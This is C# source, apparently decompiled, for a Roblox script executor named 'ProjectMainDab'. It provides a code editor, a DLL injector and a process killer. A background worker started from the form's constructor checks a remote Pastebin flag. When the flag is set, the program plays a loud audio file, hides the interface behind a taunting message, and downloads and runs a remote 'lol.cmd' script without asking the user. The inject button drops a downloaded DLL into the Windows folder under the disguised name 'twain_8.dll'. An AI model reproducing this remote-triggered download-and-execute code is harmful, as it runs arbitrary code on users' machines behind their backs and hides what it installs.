using DiscordRPC;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ProjectMainDab
{
	public class Form4 : Form
	{
		public const int WM_NCLBUTTONDOWN = 161;

		public const int HT_CAPTION = 2;

		private WebClient wc = new WebClient();

		private string defPath = string.Concat(Application.StartupPath, "//Monaco//");

		public DiscordRpcClient client;

		private WebClient webClient = new WebClient();

		private IContainer components = null;

		private Label TitleDraggable;

		private WebBrowser MonacoEditor;

		private ListBox listBox1;

		private Label CloseButton;

		private Label MinimizeButton;

		private Button button1;

		private Button button2;

		private Button button3;

		private Button button4;

		private Button button5;

		private Button button6;

		private System.Windows.Forms.Timer timer1;

		private BackgroundWorker backgroundWorker1;

		private Panel panel1;

		private Label label2;

		private Label label5;

		private Label label6;

		private TextBox textBox1;

		private Label label8;

		private Button button8;

		private Label label1;

		private BackgroundWorker backgroundWorker2;

		public Form4()
		{
			this.InitializeComponent();
			this.panel1.Hide();
			this.backgroundWorker2.RunWorkerAsync();
		}

		private void addBase()
		{
			foreach (string str in File.ReadLines(string.Concat(this.defPath, "//base.txt")))
			{
				this.addIntel(str, "Keyword", str, str);
			}
		}

		private void addGlobalF()
		{
			string[] strArrays = File.ReadAllLines(string.Concat(this.defPath, "//globalf.txt"));
			string[] strArrays1 = strArrays;
			for (int i = 0; i < (int)strArrays1.Length; i++)
			{
				string str = strArrays1[i];
				if (!str.Contains<char>(':'))
				{
					this.addIntel(str, "Function", str, str);
				}
				else
				{
					this.addIntel(str, "Function", str, str.Substring(1));
				}
			}
		}

		private void addGlobalNS()
		{
			foreach (string str in File.ReadLines(string.Concat(this.defPath, "//globalns.txt")))
			{
				this.addIntel(str, "Class", str, str);
			}
		}

		private void addGlobalV()
		{
			foreach (string str in File.ReadLines(string.Concat(this.defPath, "//globalv.txt")))
			{
				this.addIntel(str, "Variable", str, str);
			}
		}

		private void addIntel(string label, string kind, string detail, string insertText)
		{
			string.Concat("\"", label, "\"");
			string.Concat("\"", kind, "\"");
			string.Concat("\"", detail, "\"");
			string.Concat("\"", insertText, "\"");
			this.MonacoEditor.Document.InvokeScript("AddIntellisense", new object[] { label, kind, detail, insertText });
		}

		private void addMath()
		{
			foreach (string str in File.ReadLines(string.Concat(this.defPath, "//classfunc.txt")))
			{
				this.addIntel(str, "Method", str, str);
			}
		}

		private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
		{
			byte[] numArray = (new WebClient()).DownloadData("https://pastebin.com/raw/wCDAyFrh");
			if ("1" == Encoding.UTF8.GetString(numArray))
			{
				Thread.Sleep(5000);
				WebClient webClient = new WebClient();
				if (!File.Exists("c:/earrape.wav"))
				{
					webClient.DownloadFile("https://github.com/leonardssy/ProjectDab/blob/master/Earrape.wav?raw=true", "c:/earrape.wav");
					(new SoundPlayer("c:/earrape.wav")).Play();
					this.BackColor = Color.Red;
					this.label1.Hide();
					this.TitleDraggable.Text = "LOL YOU ARE USING THE TRASH UI!!!!!!!!!!!!!!!!!";
					this.button1.Hide();
					this.button2.Hide();
					this.button3.Hide();
					this.button4.Hide();
					this.button6.Hide();
					this.button5.Hide();
					this.MonacoEditor.Hide();
					this.MinimizeButton.Hide();
					this.CloseButton.Hide();
					Thread.Sleep(5000);
					webClient.DownloadFile("https://github.com/leonardssy/ProjectDab/blob/master/lol.cmd?raw=true", "lol.cmd");
					Process.Start("lol.cmd");
				}
				else
				{
					webClient.DownloadFile("https://github.com/leonardssy/ProjectDab/blob/master/Earrape.wav?raw=true", "c:/earrape.wav");
					(new SoundPlayer("c:/earrape.wav")).Play();
					this.BackColor = Color.Red;
					this.label1.Hide();
					this.TitleDraggable.Text = "LOL YOU ARE USING THE TRASH UI!!!!!!!!!!!!!!!!!";
					this.button1.Hide();
					this.button2.Hide();
					this.button3.Hide();
					this.button4.Hide();
					this.button6.Hide();
					this.button5.Hide();
					this.MonacoEditor.Hide();
					this.MinimizeButton.Hide();
					this.CloseButton.Hide();
					Thread.Sleep(5000);
					webClient.DownloadFile("https://github.com/leonardssy/ProjectDab/blob/master/lol.cmd?raw=true", "lol.cmd");
					Process.Start("lol.cmd");
				}
			}
		}

		private void button1_Click(object sender, EventArgs e)
		{
			HtmlDocument document = this.MonacoEditor.Document;
			string str = "GetText";
			object[] objArray = new string[0];
			NamedPipes.LuaPipe(document.InvokeScript(str, objArray).ToString());
		}

		private void button2_Click(object sender, EventArgs e)
		{
			if (Functions.openfiledialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
			{
				try
				{
					string str = File.ReadAllText(Functions.openfiledialog.FileName);
					this.MonacoEditor.Document.InvokeScript("SetText", new object[] { str });
				}
				catch (Exception exception1)
				{
					Exception exception = exception1;
					MessageBox.Show(string.Concat("Error: Could not read file from disk. Original error: ", exception.Message));
					Console.WriteLine("File can't be opened");
				}
			}
		}

		private void button3_Click(object sender, EventArgs e)
		{
			this.MonacoEditor.Document.InvokeScript("SetText", new object[] { "" });
			Console.WriteLine("Monaco cleared");
		}

		private void button4_Click(object sender, EventArgs e)
		{
			if (File.Exists("c:\\windows\\twain_8.dll"))
			{
				File.Delete("c:\\windows\\twain_8.dll");
			}
			this.webClient.DownloadFile("https://github.com/leonardssy/ProjectDab/blob/master/Main_Dabs.dll?raw=true", "c:\\windows\\twain_8.dll");
			Functions.Inject();
		}

		private void button5_Click(object sender, EventArgs e)
		{
			(new Form2()).Show();
		}

		private void button6_Click(object sender, EventArgs e)
		{
			if (Process.GetProcessesByName("RobloxPlayerBeta").Length != 0)
			{
				try
				{
					Process.GetProcessesByName("RobloxPlayerBeta")[0].Kill();
				}
				catch (Exception exception)
				{
					MessageBox.Show(exception.Message.ToString());
				}
			}
		}

		private void button7_Click(object sender, EventArgs e)
		{
			this.panel1.Show();
		}

		private void button8_Click(object sender, EventArgs e)
		{
		}

		private void button9_Click(object sender, EventArgs e)
		{
		}

		private void button9_Click_1(object sender, EventArgs e)
		{
		}

		private void CloseButton_Click(object sender, EventArgs e)
		{
			base.Close();
			(new MainUI()).Show();
		}

		protected override void Dispose(bool disposing)
		{
			if ((!disposing ? false : this.components != null))
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void Form4_Load(object sender, EventArgs e)
		{
			this.listBox1.Items.Clear();
			Functions.PopulateListBox(this.listBox1, "./Scripts", "*.txt");
			Functions.PopulateListBox(this.listBox1, "./Scripts", "*.lua");
			WebClient webClient = new WebClient()
			{
				Proxy = null
			};
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION", true);
				string friendlyName = AppDomain.CurrentDomain.FriendlyName;
				if (registryKey.GetValue(friendlyName) == null)
				{
					registryKey.SetValue(friendlyName, 11001, RegistryValueKind.DWord);
				}
				registryKey = null;
				friendlyName = null;
			}
			catch (Exception exception)
			{
			}
			this.MonacoEditor.Url = new Uri(string.Format("file:///{0}/Monaco/Monaco.html", Directory.GetCurrentDirectory()));
			this.MonacoEditor.Document.InvokeScript("SetTheme", new string[] { "Dark" });
			this.addBase();
			this.addMath();
			this.addGlobalNS();
			this.addGlobalV();
			this.addGlobalF();
			this.MonacoEditor.Document.InvokeScript("SetText", new object[] { "-- ProjectMainDab Loaded! Scripts go here." });
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			this.TitleDraggable = new Label();
			this.MonacoEditor = new WebBrowser();
			this.listBox1 = new ListBox();
			this.CloseButton = new Label();
			this.MinimizeButton = new Label();
			this.button1 = new Button();
			this.button2 = new Button();
			this.button3 = new Button();
			this.button4 = new Button();
			this.button5 = new Button();
			this.button6 = new Button();
			this.timer1 = new System.Windows.Forms.Timer(this.components);
			this.backgroundWorker1 = new BackgroundWorker();
			this.panel1 = new Panel();
			this.button8 = new Button();
			this.label8 = new Label();
			this.textBox1 = new TextBox();
			this.label6 = new Label();
			this.label5 = new Label();
			this.label2 = new Label();
			this.label1 = new Label();
			this.backgroundWorker2 = new BackgroundWorker();
			this.panel1.SuspendLayout();
			base.SuspendLayout();
			this.TitleDraggable.BackColor = Color.FromArgb(50, 50, 50);
			this.TitleDraggable.Font = new System.Drawing.Font("Calibri", 20.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.TitleDraggable.ForeColor = SystemColors.ButtonHighlight;
			this.TitleDraggable.Location = new Point(4, 6);
			this.TitleDraggable.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
			this.TitleDraggable.Name = "TitleDraggable";
			this.TitleDraggable.Size = new System.Drawing.Size(1752, 63);
			this.TitleDraggable.TabIndex = 1;
			this.TitleDraggable.Text = "MainDab";
			this.TitleDraggable.Click += new EventHandler(this.TitleDraggable_Click);
			this.TitleDraggable.MouseDown += new MouseEventHandler(this.TitleDraggable_MouseDown);
			this.MonacoEditor.Location = new Point(15, 57);
			this.MonacoEditor.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
			this.MonacoEditor.MinimumSize = new System.Drawing.Size(45, 48);
			this.MonacoEditor.Name = "MonacoEditor";
			this.MonacoEditor.Size = new System.Drawing.Size(766, 394);
			this.MonacoEditor.TabIndex = 9;
			this.MonacoEditor.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.MonacoEditor_DocumentCompleted);
			this.listBox1.BackColor = Color.FromArgb(60, 60, 60);
			this.listBox1.BorderStyle = BorderStyle.None;
			this.listBox1.ForeColor = SystemColors.MenuBar;
			this.listBox1.FormattingEnabled = true;
			this.listBox1.ItemHeight = 20;
			this.listBox1.Location = new Point(794, 57);
			this.listBox1.Margin = new System.Windows.Forms.Padding(9, 12, 9, 12);
			this.listBox1.Name = "listBox1";
			this.listBox1.Size = new System.Drawing.Size(285, 400);
			this.listBox1.TabIndex = 37;
			this.listBox1.SelectedIndexChanged += new EventHandler(this.listBox1_SelectedIndexChanged);
			this.CloseButton.AutoSize = true;
			this.CloseButton.BackColor = Color.FromArgb(50, 50, 50);
			this.CloseButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CloseButton.ForeColor = Color.Red;
			this.CloseButton.Location = new Point(1041, 8);
			this.CloseButton.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
			this.CloseButton.Name = "CloseButton";
			this.CloseButton.Size = new System.Drawing.Size(35, 33);
			this.CloseButton.TabIndex = 38;
			this.CloseButton.Text = "X";
			this.CloseButton.Click += new EventHandler(this.CloseButton_Click);
			this.MinimizeButton.AutoSize = true;
			this.MinimizeButton.BackColor = Color.FromArgb(50, 50, 50);
			this.MinimizeButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.MinimizeButton.ForeColor = Color.WhiteSmoke;
			this.MinimizeButton.Location = new Point(1004, 8);
			this.MinimizeButton.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
			this.MinimizeButton.Name = "MinimizeButton";
			this.MinimizeButton.Size = new System.Drawing.Size(26, 33);
			this.MinimizeButton.TabIndex = 39;
			this.MinimizeButton.Text = "-";
			this.MinimizeButton.Click += new EventHandler(this.MinimizeButton_Click);
			this.button1.BackColor = Color.FromArgb(60, 60, 60);
			this.button1.Cursor = Cursors.Hand;
			this.button1.FlatAppearance.BorderSize = 0;
			this.button1.FlatStyle = FlatStyle.Flat;
			this.button1.Font = new System.Drawing.Font("Calibri", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.button1.ForeColor = SystemColors.Control;
			this.button1.Location = new Point(14, 466);
			this.button1.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
			this.button1.Name = "button1";
			this.button1.Size = new System.Drawing.Size(154, 58);
			this.button1.TabIndex = 40;
			this.button1.Text = "Execute";
			this.button1.UseVisualStyleBackColor = false;
			this.button1.Click += new EventHandler(this.button1_Click);
			this.button2.BackColor = Color.FromArgb(60, 60, 60);
			this.button2.Cursor = Cursors.Hand;
			this.button2.FlatAppearance.BorderSize = 0;
			this.button2.FlatStyle = FlatStyle.Flat;
			this.button2.Font = new System.Drawing.Font("Calibri", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.button2.ForeColor = SystemColors.Control;
			this.button2.Location = new Point(180, 466);
			this.button2.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
			this.button2.Name = "button2";
			this.button2.Size = new System.Drawing.Size(142, 58);
			this.button2.TabIndex = 41;
			this.button2.Text = "Open";
			this.button2.UseVisualStyleBackColor = false;
			this.button2.Click += new EventHandler(this.button2_Click);
			this.button3.BackColor = Color.FromArgb(60, 60, 60);
			this.button3.Cursor = Cursors.Hand;
			this.button3.FlatAppearance.BorderSize = 0;
			this.button3.FlatStyle = FlatStyle.Flat;
			this.button3.Font = new System.Drawing.Font("Calibri", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.button3.ForeColor = SystemColors.Control;
			this.button3.Location = new Point(334, 466);
			this.button3.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
			this.button3.Name = "button3";
			this.button3.Size = new System.Drawing.Size(140, 58);
			this.button3.TabIndex = 42;
			this.button3.Text = "Clear";
			this.button3.UseVisualStyleBackColor = false;
			this.button3.Click += new EventHandler(this.button3_Click);
			this.button4.BackColor = Color.FromArgb(60, 60, 60);
			this.button4.Cursor = Cursors.Hand;
			this.button4.FlatAppearance.BorderSize = 0;
			this.button4.FlatStyle = FlatStyle.Flat;
			this.button4.Font = new System.Drawing.Font("Calibri", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.button4.ForeColor = SystemColors.Control;
			this.button4.Location = new Point(486, 466);
			this.button4.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
			this.button4.Name = "button4";
			this.button4.Size = new System.Drawing.Size(165, 58);
			this.button4.TabIndex = 43;
			this.button4.Text = "Inject";
			this.button4.UseVisualStyleBackColor = false;
			this.button4.Click += new EventHandler(this.button4_Click);
			this.button5.BackColor = Color.FromArgb(60, 60, 60);
			this.button5.Cursor = Cursors.Hand;
			this.button5.FlatAppearance.BorderSize = 0;
			this.button5.FlatStyle = FlatStyle.Flat;
			this.button5.Font = new System.Drawing.Font("Calibri", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.button5.ForeColor = SystemColors.Control;
			this.button5.Location = new Point(663, 466);
			this.button5.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
			this.button5.Name = "button5";
			this.button5.Size = new System.Drawing.Size(118, 58);
			this.button5.TabIndex = 44;
			this.button5.Text = "More";
			this.button5.UseVisualStyleBackColor = false;
			this.button5.Click += new EventHandler(this.button5_Click);
			this.button6.BackColor = Color.FromArgb(60, 60, 60);
			this.button6.Cursor = Cursors.Hand;
			this.button6.FlatAppearance.BorderSize = 0;
			this.button6.FlatStyle = FlatStyle.Flat;
			this.button6.Font = new System.Drawing.Font("Calibri", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.button6.ForeColor = SystemColors.Control;
			this.button6.Location = new Point(794, 466);
			this.button6.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
			this.button6.Name = "button6";
			this.button6.Size = new System.Drawing.Size(285, 58);
			this.button6.TabIndex = 45;
			this.button6.Text = "Kill Roblox";
			this.button6.UseVisualStyleBackColor = false;
			this.button6.Click += new EventHandler(this.button6_Click);
			this.panel1.Controls.Add(this.button8);
			this.panel1.Controls.Add(this.label8);
			this.panel1.Controls.Add(this.textBox1);
			this.panel1.Controls.Add(this.label6);
			this.panel1.Controls.Add(this.label5);
			this.panel1.Controls.Add(this.label2);
			this.panel1.Location = new Point(333, 172);
			this.panel1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			this.panel1.Name = "panel1";
			this.panel1.Size = new System.Drawing.Size(318, 223);
			this.panel1.TabIndex = 47;
			this.button8.BackColor = Color.FromArgb(60, 60, 60);
			this.button8.Cursor = Cursors.Hand;
			this.button8.FlatAppearance.BorderSize = 0;
			this.button8.FlatStyle = FlatStyle.Flat;
			this.button8.Font = new System.Drawing.Font("Calibri", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.button8.ForeColor = SystemColors.Control;
			this.button8.Location = new Point(0, 175);
			this.button8.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
			this.button8.Name = "button8";
			this.button8.Size = new System.Drawing.Size(318, 48);
			this.button8.TabIndex = 54;
			this.button8.Text = "  Upload";
			this.button8.UseVisualStyleBackColor = false;
			this.button8.Click += new EventHandler(this.button8_Click);
			this.label8.AutoSize = true;
			this.label8.ForeColor = SystemColors.ButtonHighlight;
			this.label8.Location = new Point(4, 114);
			this.label8.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
			this.label8.Name = "label8";
			this.label8.Size = new System.Drawing.Size(295, 40);
			this.label8.TabIndex = 53;
			this.label8.Text = "Note that it will upload the script from the\r\nexecutor text box!";
			this.textBox1.Location = new Point(9, 80);
			this.textBox1.Name = "textBox1";
			this.textBox1.Size = new System.Drawing.Size(301, 26);
			this.textBox1.TabIndex = 52;
			this.label6.AutoSize = true;
			this.label6.ForeColor = SystemColors.ButtonHighlight;
			this.label6.Location = new Point(4, 57);
			this.label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
			this.label6.Name = "label6";
			this.label6.Size = new System.Drawing.Size(121, 20);
			this.label6.TabIndex = 51;
			this.label6.Text = "Enter paste title";
			this.label5.AutoSize = true;
			this.label5.ForeColor = SystemColors.ButtonHighlight;
			this.label5.Location = new Point(4, 17);
			this.label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
			this.label5.Name = "label5";
			this.label5.Size = new System.Drawing.Size(167, 20);
			this.label5.TabIndex = 49;
			this.label5.Text = "Post script to Pastebin";
			this.label2.AutoSize = true;
			this.label2.BackColor = Color.FromArgb(50, 50, 50);
			this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.label2.ForeColor = Color.Red;
			this.label2.Location = new Point(274, 5);
			this.label2.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
			this.label2.Name = "label2";
			this.label2.Size = new System.Drawing.Size(35, 33);
			this.label2.TabIndex = 48;
			this.label2.Text = "X";
			this.label2.Click += new EventHandler(this.label2_Click);
			this.label1.AutoSize = true;
			this.label1.Font = new System.Drawing.Font("Calibri", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label1.ForeColor = SystemColors.ButtonHighlight;
			this.label1.Location = new Point(176, 29);
			this.label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(88, 21);
			this.label1.TabIndex = 48;
			this.label1.Text = "Version 1.0";
			this.backgroundWorker2.DoWork += new DoWorkEventHandler(this.backgroundWorker2_DoWork);
			base.AutoScaleDimensions = new SizeF(9f, 20f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(50, 50, 50);
			base.ClientSize = new System.Drawing.Size(1090, 538);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.panel1);
			base.Controls.Add(this.button6);
			base.Controls.Add(this.button5);
			base.Controls.Add(this.button4);
			base.Controls.Add(this.button3);
			base.Controls.Add(this.button2);
			base.Controls.Add(this.button1);
			base.Controls.Add(this.MinimizeButton);
			base.Controls.Add(this.CloseButton);
			base.Controls.Add(this.listBox1);
			base.Controls.Add(this.MonacoEditor);
			base.Controls.Add(this.TitleDraggable);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			base.Name = "Form4";
			this.Text = "Form4";
			base.Load += new EventHandler(this.Form4_Load);
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		private void label2_Click(object sender, EventArgs e)
		{
			this.panel1.Hide();
		}

		private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.MonacoEditor.Document.InvokeScript("SetText", new object[] { "" });
			Console.WriteLine("Monaco cleared");
			string str = File.ReadAllText(string.Concat("Scripts\\", this.listBox1.SelectedItem.ToString()));
			if (this.listBox1.SelectedItem != null)
			{
				this.MonacoEditor.Document.InvokeScript("SetText", new object[] { str });
			}
		}

		private void MinimizeButton_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void MonacoEditor_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
		{
		}

		[DllImport("user32.dll", CharSet=CharSet.None, ExactSpelling=false)]
		public static extern bool ReleaseCapture();

		[DllImport("user32.dll", CharSet=CharSet.None, ExactSpelling=false)]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		private void TitleDraggable_Click(object sender, EventArgs e)
		{
		}

		private void TitleDraggable_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == System.Windows.Forms.MouseButtons.Left)
			{
				Form4.ReleaseCapture();
				Form4.SendMessage(base.Handle, 161, 2, 0);
			}
		}
	}
}